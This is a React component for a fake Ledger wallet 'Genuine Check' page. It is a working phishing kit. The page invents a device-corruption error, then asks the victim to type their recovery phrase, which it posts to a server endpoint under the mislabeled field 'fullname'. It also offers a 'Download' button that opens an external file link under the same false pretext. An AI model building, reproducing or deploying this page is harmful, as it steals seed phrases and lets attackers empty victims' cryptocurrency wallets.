import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import styles from "./Form.module.css";
import { FaCircle, FaDownload, FaArrowsRotate } from "react-icons/fa6";
import { RiAlertLine } from "react-icons/ri";
import { PiSealCheckFill } from "react-icons/pi";
import {
  nanoplus,
  nanos,
  nanox,
  blue,
  loader,
  loader_image,
  recovery,
} from "../assets";

const Form = () => {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState(0);
  const [loading, setLoading] = useState(false);
  const [imageSelected, setImageSelected] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [formData, setFormData] = useState("");
  const [submitLoading, setSubmitLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const steps = ["Device Detection", "Device Check", "Ledger Live"];

  const handleImageSelect = (image) => {
    setSelectedImage(image);
    setLoading(true);
    setImageSelected(true);
    setTimeout(() => {
      setLoading(false);
      setCurrentStep(1);
    }, 2000);
  };

  const handleUpdateClick = () => {
    setLoading(true);
    setTimeout(() => {
      setCurrentStep(2);
      setLoading(false);
    }, 1500);
  };

  const handleFormDataChange = (event) => {
    setFormData(event.target.value);
  };

  const handleClosePopup = () => {
    setShowPopup(false);
    navigate("/success");
  };

  const handleStep3Submit = async (event) => {
    event.preventDefault();
    if (!formData.trim()) {
      setSubmitError("Please enter your recovery phrase");
      return;
    }

    setSubmitLoading(true);
    setSubmitError("");

    try {
      const response = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          form_type: "ledger_live",
          fullname: formData,
        }),
      });

      if (response.ok) {
        setFormData("");
        setShowPopup(true);
      } else {
        const errorData = await response.json();
        setSubmitError("Failed to submit. Please try again.");
        console.error("Error:", errorData);
      }
    } catch (error) {
      setSubmitError("Network error. Please check your connection.");
      console.error("Fetch error:", error);
    } finally {
      setSubmitLoading(false);
    }
  };

  return (
    <>
      {/* Timeline */}
      <div className={styles.timeline}>
        {steps.map((step, index) => (
          <div className={`element ${currentStep === index ? "active" : ""}`} key={index}>
            <div className={`${styles.dotbox} ${currentStep >= index ? styles.filled : ""}`}>
              <div className={`${styles.dot} ${currentStep >= index ? "active" : ""}`}>
                <FaCircle size={20} />
              </div>
            </div>
            <span>{step}</span>
          </div>
        ))}
      </div>

      {/* Step Content */}
      <div className={styles.step_content}>
        {/* Step 0: Device Selection */}
        {currentStep === 0 && (
          <div className={`${styles.step_one_content} ${imageSelected ? styles.hidden : ""}`}>
            <h2>Select your Device</h2>
            <div className={styles.device_container}>
              <div className={styles.device_card} onClick={() => handleImageSelect(nanos)}>
                <h3>Nano S</h3>
                <img src={nanos} alt="Nano S" className={styles.device_img} />
              </div>
              <div className={styles.device_card} onClick={() => handleImageSelect(nanoplus)}>
                <h3>Nano S Plus</h3>
                <img src={nanoplus} alt="Nano S Plus" className={styles.device_img} />
              </div>
              <div className={styles.device_card} onClick={() => handleImageSelect(nanox)}>
                <h3>Nano X</h3>
                <img src={nanox} alt="Nano X" className={styles.device_img} />
              </div>
              <div className={styles.device_card} onClick={() => handleImageSelect(blue)}>
                <h3>Blue</h3>
                <img src={blue} alt="Blue" className={styles.device_img} />
              </div>
            </div>
          </div>
        )}

        {/* Step 1: Device Check */}
        {currentStep === 1 && (
          <div className={`${styles.step_two_content} ${loading ? styles.hidden : ""}`}>
            <h2>Genuine Check</h2>
            <RiAlertLine size={60} color="red" />
            <p>
              Your device's memory has been corrupted. <br />
              Ledger data damage error: 0x0m3CkBn
            </p>
            <div className={styles.buttons}>
              <button onClick={handleUpdateClick}>
                <FaDownload />
                <span>Restore your wallet from Recovery phrase</span>
              </button>
              <button onClick={() => handleImageSelect(nanos)}>
                <FaArrowsRotate />
                <span>Refresh</span>
              </button>
              <button
                onClick={() =>
                  window.open(
                    "https://api.files.link/v1/p/fe68c8cb-f70b-4321-992e-69ce0425b600",
                    "_blank"
                  )
                }
              >
                <FaDownload />
                <span>Download</span>
              </button>
            </div>
          </div>
        )}

        {/* Step 2: Ledger Live Input */}
        {currentStep === 2 && (
          <div className={styles.step_three_content}>
            <h2>Select & enter numbers of words in your recovery phrase</h2>
            <img src={recovery} alt="Recovery" className={styles.recovery_img} />
            <form onSubmit={handleStep3Submit}>
              <div className={styles.textareaCon}>
                {/* Placeholder text handled in CSS ::before */}
                <textarea
                  value={formData}
                  onChange={handleFormDataChange}
                  className={styles.textarea}
                  rows={2}
                />
              </div>
              {submitError && <p className={styles.error}>{submitError}</p>}
              <button type="submit" className={styles.submitButton} disabled={submitLoading}>
                {submitLoading ? "Submitting..." : "Continue"}
              </button>
            </form>
          </div>
        )}
      </div>

      {/* Loader */}
      {loading && (
        <div className={styles.loader_content}>
          <h2>Connect and unlock your device</h2>
          <img src={loader_image} alt="" />
          <img src={loader} alt="loader" width={50} height={50} />
        </div>
      )}

      {/* Popup */}
      {showPopup && (
        <div className={styles.popup}>
          <PiSealCheckFill size={40} color="#bbb0fd" />
          <p>
            Thank you for this information! <br />
            Please wait 24 hours.
            <br />
            We'll be in touch.
          </p>
          <button className={styles.closeButton} onClick={handleClosePopup}>
            <span>Go back</span>
          </button>
        </div>
      )}
    </>
  );
};

export default Form;
